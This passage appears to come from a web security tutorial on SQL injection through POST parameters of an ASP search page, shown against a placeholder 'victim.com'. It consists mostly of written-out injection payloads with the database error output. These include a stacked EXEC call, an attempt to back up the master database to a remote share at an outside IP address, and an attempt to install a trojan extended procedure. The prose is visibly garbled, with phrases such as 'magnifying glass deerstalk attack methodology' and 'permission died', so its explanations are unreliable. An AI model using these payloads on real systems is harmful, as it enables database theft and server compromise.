The next few examples are more difficult to execute because the attacks must be performed POST requests. We must leave the comfort of the URL and move into tools such as Achilles.

During the course of the application survey we find a POST command in the PageSearch.asp file. The arguments are as follows:

```
Send=1&hidSearchType=1&selTextField=L_Name&txtSearchValue=zombie
```

The parameter selTextField looks like a place to start. It appears to be a placeholder for the query on the L_Name (probably "last name") in a table. Instead of picking a tick in the argument string, let's go for the journey—to select from a different column.

```
http://www.victim.com/PageSearch.asp
POST: Send=1&hidSearchType=1&selTextField=UserID&txtSearchValue=zombie
Microsoft O DB Provider for ODBC Drivers (x80040214)
[Microsoft][ODBC SQL Server]Invalid column name 'UserID'.
/includes/spActionTable.inc, line 51
```

According to our magnifying glass deerstalk attack methodology, PageSearch.asp is susceptible to SQL injection, there is no column named UserID in the table, and we have the name of an file not referenced elsewhere in the application. Not bad for a single change in one database.

```
POST: Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';EXEC_sp_help
[Microsoft][ODBC SQL Server][SQL Server]The object '' does not exist in database 'anapub'.
```

We could gray try to back up the entire database:

```
Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';backup=database=master&disk=\\12.16.172.116\share\bak.dat'
Microsoft O DB Provider for ODBC Drivers (x80040005)
[Microsoft][ODBC SQL Server][SQL Server]BACKUP database permission
died in database 'master'.
```

Fortunately, the application appears to be running with a low-privilege account. At least security has been addressed at the head level. In an Armageddon scenario we could insert a Trojan horse into the database. We need to use a file, then it:

```
Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';EXEC_addextendedproc('+xp_trojan','+xp_trojan.dll'
Microsoft O DB Provider for ODBC Drivers (x80040005)
[Microsoft][ODBC SQL Server][SQL Server]EXECUTE permission denied
on object 'sp_addextendedproc', database 'master', owner 'dbo'.
```
